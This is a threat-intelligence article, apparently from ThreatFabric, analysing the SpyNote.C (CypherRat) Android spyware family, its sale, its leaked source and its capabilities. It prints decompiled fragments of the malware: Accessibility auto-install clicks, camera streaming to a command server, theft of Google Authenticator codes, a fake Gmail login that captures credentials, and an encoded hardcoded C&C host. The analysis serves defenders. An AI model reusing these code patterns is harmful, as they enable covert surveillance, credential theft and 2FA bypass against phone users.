Uncovering the Latest Developments in SpyNote
Android Spyware is one of the most common kinds of malware used by attackers to gain access to personal data and carry out fraud
operations. Due to its capability to track a user’s location, examine web browsing behavioral patterns, and even steal sensitive information,
such as passwords and credit card numbers, the threat level that Android Spyware poses to banking institutions and banking customers
alike is comparable to Android Banking malware.

Spyware also has the potential to record phone calls, remotely manage the device, intercept SMS messages, and perform other tasks by
using legitimate APIs and permissions that are intended to aid people.
In the last quarter of 2022, ThreatFabric researchers observed a large increase in volume for samples belonging to the SpyNote Malware
family. This family, which is also known as SpyMax, is an unique and effective Spyware designed to secretly observe user activity on an
Android device. The SpyNote malware can monitor, manage, and modify the device’s resources and features along with Remote access
capabilities.
This spyware family has evolved over time, with the adoption of cutting-edge methods and technologies. SpyNote has several distinct
variants: the most recent one, SpyNote.C, is routinely traced and tracked in day-to-day operations, and makes up for the majority of
spyware samples ThreatFabric observed from October 2022.
One of the main differences between the first variants, SpyNote.A and SpyNote.B, and the latest one, SpyNote.C, is the campaign
objective. SpyNote.C has been the first variant to openly target banking applications, impersonating a large number of reputable financial
institutions like HSBC, Deutsche Bank, Kotak Bank, BurlaNubank, as well as others to well-known applications like WhatsApp, Facebook,
and Google Play.

In addition, we also observed that the attackers utilize more generic application masquerades, such as wallpaper apps, productivity apps, or
gaming apps.
ThreatFabric researchers have identified that some of the SpyNote.C classified apps are being developed by lone actors and promoted as
CypherRat. In this article we will discuss how developments on this actor’s project, which is advertised as both spyware and banking
malware, are likely behind the surge in numbers that we observed in the last few months.
Other SpyNote.C campaigns were discovered while analyzing this Spyware family, impersonating System Notifications, Google Play Store.
These campaigns ran together with the previously mentioned ones, with the one shown below sharing the same hosts used as C2.

SpyNote Alias CypherRat
The latest variant of this malware family, SpyNote.C, was further developed and sold to individual actors via Telegram channel by its
developer, under the name CypherRat.
The threat actor offered CypherRat for sale utilizing the Sellix payment system, which uses Cryptocurrencies to prevent tracking. These
sales ran from August 2021 until October 2022, accumulating more than 80 separate customers.

In October 2022, the source code was made available as open-source via GitHub, after a leak and a few scamming incidents in hacking
forums, where actors would impersonate the original threat actor to steal money from other criminals.

Following the release of the source code, the number of samples counts have increase significantly, as we can observe in the statistical
view using our ThreatFabric Intelligence data.

As you can see, the numbers are following a clear upward trend, which allowed ThreatFabric to collect more than 1100
SpyNote/CypherRat samples from October 2022; this number equals the amount of samples that we saw from the first test version of this
variant collected in 2020.
During the course of our investigation, we discovered that the original creator had switched his focus to a new spyware project, CraxsRat,
as a paid application with similar capabilities as the original project.

Outstanding Capabilities means Exceptional Abilities
4/8

We were interested in the unique spyware skills that the SpyNote.C malware variant can do, which were identified in malicious financial
apps with RAT capabilities around 2022. We have highlighted a few of these features, which can be used to exfiltrate and utilize PII from
online banking customers.
Using the privileges requested in the screenshot below, This SpyNote variant can be used to track SMS messages, calls, videos, and audio
recordings in addition to updating its version and even installing new applications.

The most recent versions of SpyNote are not only extremely powerful, but they also include a variety of security features, from simple string
obfuscation to the use of commercial packers. This makes it much more difficult to analyze, making it a potent tool for threat actors.

Below is a list of some of the SpyNote’s standout features:

5/8

Ability to use the Camera API to record and send videos from the device’s camera to the Command and Control(C&C) center
GPS and network location tracking information
Uses Accessibility (A11y) to extract codes from Google Authenticator.
Uses Keylogging powered by Accessibility services, to steal banking credentials.

Accessibility Service
SpyNote uses Accessibility Services to make it difficult for users to uninstall the application, install new versions, and install other apps.
Without any user input, SpyNote can click on the “install” and “update” buttons thanks to accessibility services:
// click 'install' button via A11y
if("android.widget.Button".equals(accessibilityNodeInfo0.getClassName())) {
String s = accessibilityNodeInfo0.getText().toString();
if(!TextUtils.isEmpty(s) && (("安装".equals(s)) || ("install".equals(s.toLowerCase())) || ("done".equals(s.toLowerCase())) ||
("完成".equals(s)) || ("\u062A\u062B\u0628\u064A\u062A".equals(s)) || ("确定".equals(s)))) {
accessibilityNodeInfo0.performAction(16);
return true;
}
}

This malicious malware can access a device’s camera and send videos right to its Command-and-Control(C&C) server, which is one of its
most dangerous capabilities, and can be used to extract PII from the infected device. This gives the attacker complete control over the
device’s camera, enabling them to spy on the user with it.
camera_stream.camera = Camera.open(Integer.valueOf(this.vul[0]).intValue());
...
InetSocketAddress inetSocketAddress0 = new InetSocketAddress(InetAddress.getByName(addr), v);
camera_stream.socket.connect(inetSocketAddress0, 60000);
...
Camera.Parameters params = camera_stream.camera.getParameters();
camera_stream.camera.startPreview();

Google Authenticator with A11y
SpyNote leverages Accessibility feature to obtain two-factor authentication (2FA) codes. These codes are used as an additional layer of
security in order to access an account, and are often required for logging into websites, applications, and other services. By exploiting the
accessibility features of the Google Authenticator app, SpyNote is able to bypass these security measures and gain access to an account
without the user’s knowledge.
packagename = "com.google.android.apps.authenticator2"
Iterator iterator0 = utils.findNodeWithClass(accessibilityEvent0.getSource(), "android.view.ViewGroup").iterator();
AccessibilityNodeInfo accessibilityNodeInfo1 = accessibilityNodeInfo0.getChild(v);
s1 = s1 + accessibilityNodeInfo1.getText().toString() + "-";
arr_s = s1.split("-");
...
shared.log(utils.ssss, "Google Authenticator<" + arr_s[v] + "<" + arr_s[v + 1].getBytes());

SpyNote also has the capacity to function as a social app credential stealer. This is done by deceiving users into entering their private login
information during the login process by launching a webpage with a custom layout that looks a lot like famous services like Gmail and
Facebook, much like a traditional overlay attack is used to show victims a bogus login page for their banking application.
Upon receiving a command from the attacker, the attacker’s C&C server receives the credentials and information that were acquired from
the webpage.

6/8

// show fake Gmail for Facebook layout
social_creds.this.setContentView(0x7F070001); // layout:glogin
// set callbacks to handle clicks
social_creds.this.findViewById(0x7F050031).setOnClickListener(singimallisten); // id:sinbtn
social_creds.this.findViewById(0x7F050023).setOnClickListener(lrnmor); // id:lrnmor
social_creds.this.findViewById(0x7F050016).setOnClickListener(Recovergmal); // id:gmailforgtpass
// callback to extract user and password
this.singimallisten = new View.OnClickListener() {
public void onClick(View view0) {
String usrgmail = (social_creds.this.findViewById(0x7F050043)).getText().toString(); // id:usrgmail
String passgmal = (social_creds.this.findViewById(0x7F05002C)).getText().toString(); // id:passgmal
if(usrgmail.length() <= 3) {
cmd_receiver.showToast("Please Check Your Email/Password.");
return;
}
if(passgmal.length() < 8) {
cmd_receiver.showToast("Password Must At least 8 characters.");
return;
}
shared.log(ddddd.ssss, "Gmail<" + s + "<" + s1.getBytes());
social_creds.this.done = true;
social_creds.this.finish();
}
};

The acquired sensitive information is then transferred to the C&C server hardcoded within the application upon receiving the command from
the attacker via Accessibility service, encrypted using Base64 to make it stealthier and difficult to identify the host.
// Identified host, port and key used for C&C communication
static {
AccessibilityService.key = const.encryp("bW1tbTE="); // mmmm1
AccessibilityService.c = "K";
AccessibilityService.d = "dGV4dA=="; // text
AccessibilityService.e = "ZGV2ZWxvcA=="; // develop
AccessibilityService.host = "YWRuYW5rYXJhMS5kZG5zLm5ldA=="; // adnankara1.ddns.net
AccessibilityService.port = "Nzc3MQ=="; // 7771
}

Similar code patterns were identified in all SpyNote.C related applications, and the aggregated host, port, and key strings observed from
these financial institutions are listed below:

Other common Capabilities
SpyNote also adopts common features that are observed in other Spyware by abusing legitimate APIs, such as tracking location from the
users infected device via “GPS” and “Network” thanks to “LocationManager” provided by Android system. Similarly, by abusing
MediaProjection to capture screen content.
These are not necessarily connected to banking fraud, but do offer criminals even more information on the victim.

Conclusion
As the landscape of Android Spyware evolves, mobile users are always confronted with new and innovative threats. We predict that
SpyNote will keep using Accessibility Service to collect essential data from users’ devices and that it will be able to develop towards a
successful distribution. We also believe that the trend will continue adopting better security measures like obfuscation and packers to help
safeguard the program itself. It is very likely that different forks of SpyNote will continue appearing, following the release of it source code.
Researchers at ThreatFabric are constantly keeping an eye on the mobile threat landscape, and by following various actors and
campaigns, we are able to recognize and capture malware that specifically targets financial institutions. This development is not as
common within the Android Spyware ecosystem, but is extremely dangerous and shows the potential start of a new trend, which will see a
gradual disappearance of the distinction between spyware and Banking malware, due to the power that the abuse of Accessibility services
gives to criminals.
